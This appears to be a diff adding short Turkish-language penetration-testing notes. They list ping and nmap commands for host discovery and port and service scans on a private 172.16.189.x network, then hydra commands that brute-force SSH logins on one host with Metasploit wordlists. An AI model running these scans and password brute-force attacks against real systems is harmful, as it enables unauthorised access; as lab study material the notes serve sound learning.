@@ -1,0 +1,13 @@
+Bulunduğum ağda hangi makinalar var? 
+ping -c 1 -W 1 172.16.189.176
+nmap -n -sP 172.16.189.1-254
+nmap -n -sP 172.16.189.1-254 --reason
+nmap -n -sP 172.16.189.1-254 --reason 
+--packet-trace
+Hangi portlar açık? 172.16.189.188
+nmap -n -p1-1000 172.16.189.188 --open
+nmap -n -p1-65535 172.16.189.188 --open --reason
+nmap -n -p1-1000 -sV 172.16.189.188
+cd /usr/share/wordlists/metasploit
+hydra -L unix_users.txt -P unix_passwords.txt ssh://172.16.189.188
+hydra -l user -P unix_passwords.txt ssh://172.16.189.188
